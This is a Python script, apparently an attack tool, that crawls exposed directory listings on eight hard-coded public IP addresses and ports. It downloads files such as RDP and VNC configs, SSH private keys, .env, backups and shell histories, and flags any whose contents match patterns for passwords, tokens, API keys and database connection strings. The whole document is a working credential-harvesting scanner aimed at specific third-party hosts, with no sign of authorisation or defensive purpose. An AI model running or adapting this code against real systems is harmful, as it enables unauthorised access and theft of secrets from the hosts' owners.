import requests, urllib3, re, sys, threading, time, json
from urllib.parse import urljoin, urlparse
urllib3.disable_warnings()

targets = [
    ("193.26.209.18", 7575, "/api/"),
    ("193.26.209.17", 4563, "/api/"),
    ("91.224.84.79", 880, "/centr_buk/"),
    ("139.28.39.162", 4406, "/frankekiev/"),
    ("194.44.109.106", 32980, "/"),
    ("193.169.80.196", 54333, "/Pic/"),
    ("185.237.106.167", 8081, "/"),
    ("91.224.84.79", 880, "/cgi-bin/"),
]

creds_patterns = [
    r'\.rdp$', r'\.vnc$', r'vncpass', r'connections\.xml', r'servers\.xml',
    r'krdc', r'remmina', r'mRemoteNG', r'RoyalTS', r'freerdp', r'xfreerdp',
    r'mstsc', r'vncviewer', r'-passwd', r'id_rsa', r'id_ed25519', r'id_ecdsa',
    r'\.pem$', r'\.key$', r'private_key', r'authorized_keys', r'\.bash_history',
    r'\.ssh/', r'known_hosts', r'password', r'passwd', r'secret', r'token',
    r'api_key', r'apikey', r'credential', r'login', r'username', r'user:',
    r'host:', r'port:', r'database', r'jdbc:', r'mongodb://', r'postgres://',
    r'mysql://', r'redis://', r'amqp://', r'ssh-rsa', r'ssh-ed25519',
    r'PRIVATE KEY', r'BEGIN RSA', r'BEGIN OPENSSH', r'BEGIN DSA',
]

found = []
lock = threading.Lock()
visited = set()
max_depth = 3

def scan_dir(ip, port, path, depth=0):
    if depth > max_depth:
        return
    url = f"http://{ip}:{port}{path}"
    norm = url.rstrip('/')
    if norm in visited:
        return
    visited.add(norm)
    
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code != 200:
            return
        content = r.text
        
        # Check for creds in content
        for pat in creds_patterns:
            if re.search(pat, content, re.IGNORECASE):
                with lock:
                    found.append(f"{url} -> MATCH: {pat}")
                break
        
        # Parse links
        links = re.findall(r'href="([^"]*)"', content)
        for link in links:
            if link in ['../', './', '/']:
                continue
            full = urljoin(url + '/', link)
            # Only follow subdirectories (ending with /) or files with interesting extensions
            if link.endswith('/'):
                scan_dir(ip, port, urlparse(full).path, depth + 1)
            elif any(link.lower().endswith(ext) for ext in ['.rdp', '.vnc', '.xml', '.cfg', '.conf', '.ini', '.env', '.yml', '.yaml', '.json', '.sql', '.bak', '.backup', '.old', '.txt', '.log', '.history', '.sh', '.py', '.php', '.js', '.key', '.pem', '.p12', '.pfx', '.crt', '.cer']):
                # Download and check file content
                try:
                    fr = requests.get(full, timeout=8, verify=False)
                    if fr.status_code == 200 and len(fr.content) < 500000:
                        fcontent = fr.text if fr.headers.get('content-type', '').startswith('text') else fr.content.decode('utf-8', errors='ignore')
                        for pat in creds_patterns:
                            if re.search(pat, fcontent, re.IGNORECASE):
                                with lock:
                                    found.append(f"{full} -> FILE MATCH: {pat} (size: {len(fr.content)})")
                                break
                except:
                    pass
    except Exception as e:
        pass

threads = []
for ip, port, path in targets:
    t = threading.Thread(target=scan_dir, args=(ip, port, path))
    t.start()
    threads.append(t)
    time.sleep(0.2)

for t in threads:
    t.join(timeout=60)

print(f"Visited: {len(visited)} URLs")
print(f"Found: {len(found)} matches")
for f in found:
    print(f)
